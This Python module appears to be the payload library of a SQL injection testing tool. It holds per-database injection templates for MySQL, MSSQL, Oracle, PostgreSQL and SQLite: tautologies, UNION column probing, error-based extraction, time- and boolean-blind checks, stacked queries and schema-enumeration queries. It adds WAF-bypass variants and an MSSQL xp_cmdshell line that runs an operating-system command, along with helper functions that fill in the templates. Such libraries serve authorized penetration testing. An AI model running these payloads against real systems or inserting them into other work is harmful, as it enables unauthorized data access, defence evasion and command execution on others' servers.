"""SQL Injection payload templates for various databases."""

from typing import Optional

# Database-specific payload templates
SQLI_TEMPLATES = {
    "generic": {
        "basic": [
            "'",
            "\"",
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "admin'--",
            "1' AND '1'='1",
            "1' AND '1'='2",
        ],
        "union_detect": [
            "' ORDER BY 1--",
            "' ORDER BY 2--",
            "' ORDER BY 3--",
            "' ORDER BY 5--",
            "' ORDER BY 10--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
        ],
        "comment_variations": [
            "'--",
            "'#",
            "'/*",
            "';--",
            "';#",
            "')--",
            "')#",
        ],
    },

    "mysql": {
        "error_based": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
        "union_columns": "' UNION SELECT {columns}--",
        "time_blind": [
            "' AND SLEEP({delay})--",
            "' AND IF(1=1,SLEEP({delay}),0)--",
            "' AND IF({condition},SLEEP({delay}),0)--",
            "' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
            "'; SELECT SLEEP({delay})--",
        ],
        "boolean_blind": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND {condition}--",
            "' AND SUBSTRING((SELECT version()),1,1)='{char}'--",
        ],
        "stacked": [
            "'; SELECT version()--",
            "'; SELECT user()--",
            "'; SELECT database()--",
        ],
        "info_gathering": {
            "version": "SELECT version()",
            "user": "SELECT user()",
            "database": "SELECT database()",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        },
    },

    "mssql": {
        "error_based": [
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND 1=CONVERT(int,(SELECT DB_NAME()))--",
        ],
        "union_columns": "' UNION SELECT {columns}--",
        "time_blind": [
            "'; WAITFOR DELAY '0:0:{delay}'--",
            "'; IF(1=1) WAITFOR DELAY '0:0:{delay}'--",
            "'; IF({condition}) WAITFOR DELAY '0:0:{delay}'--",
        ],
        "boolean_blind": [
            "' AND 1=1--",
            "' AND 1=2--",
        ],
        "stacked": [
            "'; SELECT @@version--",
            "'; SELECT DB_NAME()--",
            "'; EXEC xp_cmdshell 'whoami'--",
        ],
        "info_gathering": {
            "version": "SELECT @@version",
            "user": "SELECT SYSTEM_USER",
            "database": "SELECT DB_NAME()",
            "tables": "SELECT name FROM sysobjects WHERE xtype='U'",
            "columns": "SELECT name FROM syscolumns WHERE id=OBJECT_ID('{table}')",
        },
    },

    "oracle": {
        "error_based": [
            "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--",
            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--",
        ],
        "union_columns": "' UNION SELECT {columns} FROM dual--",
        "time_blind": [
            "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
            "' AND 1=(SELECT CASE WHEN {condition} THEN DBMS_PIPE.RECEIVE_MESSAGE('a',{delay}) ELSE 1 END FROM dual)--",
        ],
        "boolean_blind": [
            "' AND 1=1--",
            "' AND 1=2--",
        ],
        "info_gathering": {
            "version": "SELECT banner FROM v$version WHERE rownum=1",
            "user": "SELECT user FROM dual",
            "database": "SELECT ora_database_name FROM dual",
            "tables": "SELECT table_name FROM all_tables",
            "columns": "SELECT column_name FROM all_tab_columns WHERE table_name='{table}'",
        },
    },

    "postgresql": {
        "error_based": [
            "' AND 1=CAST((SELECT version()) AS int)--",
            "' AND 1=CAST(version() AS int)--",
        ],
        "union_columns": "' UNION SELECT {columns}--",
        "time_blind": [
            "'; SELECT PG_SLEEP({delay})--",
            "' AND 1=(SELECT CASE WHEN {condition} THEN PG_SLEEP({delay}) ELSE 1 END)--",
        ],
        "boolean_blind": [
            "' AND 1=1--",
            "' AND 1=2--",
        ],
        "stacked": [
            "'; SELECT version()--",
            "'; SELECT current_user--",
            "'; SELECT current_database()--",
        ],
        "info_gathering": {
            "version": "SELECT version()",
            "user": "SELECT current_user",
            "database": "SELECT current_database()",
            "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
            "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        },
    },

    "sqlite": {
        "union_columns": "' UNION SELECT {columns}--",
        "boolean_blind": [
            "' AND 1=1--",
            "' AND 1=2--",
        ],
        "info_gathering": {
            "version": "SELECT sqlite_version()",
            "tables": "SELECT name FROM sqlite_master WHERE type='table'",
            "columns": "SELECT sql FROM sqlite_master WHERE type='table' AND name='{table}'",
        },
    },
}

# WAF Bypass techniques
WAF_BYPASS_TEMPLATES = {
    "case_variation": [
        "' oR '1'='1",
        "' Or '1'='1",
        "' OR '1'='1",
    ],
    "comment_injection": [
        "'/**/OR/**/1=1--",
        "' OR/*comment*/1=1--",
        "'/**/UNION/**/SELECT/**/NULL--",
    ],
    "encoding": [
        "' %4fR '1'='1",  # URL encoded OR
        "' &#x4f;R '1'='1",  # HTML hex encoded
        "' CHAR(79)+CHAR(82) '1'='1",  # CHAR encoding
    ],
    "space_alternatives": [
        "'%09OR%091=1--",  # Tab
        "'%0aOR%0a1=1--",  # Newline
        "'%0bOR%0b1=1--",  # Vertical tab
        "'%0cOR%0c1=1--",  # Form feed
        "'%0dOR%0d1=1--",  # Carriage return
        "'+OR+1=1--",  # Plus sign
    ],
    "function_obfuscation": [
        "' OR SUBSTR(version(),1,1)='5'--",
        "' OR MID(version(),1,1)='5'--",
        "' OR LEFT(version(),1)='5'--",
    ],
}


def get_payloads(
    db_type: str = "generic",
    attack_type: str = "basic",
    delay: int = 5,
    condition: str = "1=1",
    columns: str = "NULL",
    include_waf_bypass: bool = False
) -> list[str]:
    """
    Get payloads for specific database and attack type.

    Args:
        db_type: Database type (mysql, mssql, oracle, postgresql, sqlite, generic)
        attack_type: Attack type (basic, error_based, time_blind, boolean_blind, union_detect)
        delay: Delay in seconds for time-based attacks
        condition: Condition for blind attacks
        columns: Columns for UNION attacks
        include_waf_bypass: Include WAF bypass variations

    Returns:
        List of payloads
    """
    payloads = []

    # Get database-specific payloads
    db_templates = SQLI_TEMPLATES.get(db_type, SQLI_TEMPLATES["generic"])

    if attack_type in db_templates:
        templates = db_templates[attack_type]
        if isinstance(templates, list):
            for template in templates:
                payload = template.format(delay=delay, condition=condition, columns=columns)
                payloads.append(payload)
        elif isinstance(templates, str):
            payloads.append(templates.format(delay=delay, condition=condition, columns=columns))

    # Also include generic payloads
    if db_type != "generic" and attack_type in SQLI_TEMPLATES["generic"]:
        generic_templates = SQLI_TEMPLATES["generic"][attack_type]
        if isinstance(generic_templates, list):
            payloads.extend(generic_templates)

    # Add WAF bypass variations if requested
    if include_waf_bypass:
        for bypass_type, bypass_payloads in WAF_BYPASS_TEMPLATES.items():
            payloads.extend(bypass_payloads)

    return payloads


def get_info_query(db_type: str, info_type: str, table: Optional[str] = None) -> Optional[str]:
    """
    Get information gathering query for specific database.

    Args:
        db_type: Database type
        info_type: Type of info (version, user, database, tables, columns)
        table: Table name (required for columns query)

    Returns:
        SQL query string or None
    """
    if db_type not in SQLI_TEMPLATES:
        return None

    info_queries = SQLI_TEMPLATES[db_type].get("info_gathering", {})
    query = info_queries.get(info_type)

    if query and table:
        query = query.format(table=table)

    return query


def generate_union_payload(num_columns: int, db_type: str = "generic", inject_position: int = 1) -> str:
    """
    Generate UNION SELECT payload with specified columns.

    Args:
        num_columns: Number of columns
        db_type: Database type
        inject_position: Position to inject data (1-indexed)

    Returns:
        UNION SELECT payload
    """
    columns = []
    for i in range(1, num_columns + 1):
        if i == inject_position:
            columns.append("@@version" if db_type == "mssql" else "version()")
        else:
            columns.append("NULL")

    columns_str = ",".join(columns)

    if db_type == "oracle":
        return f"' UNION SELECT {columns_str} FROM dual--"
    else:
        return f"' UNION SELECT {columns_str}--"
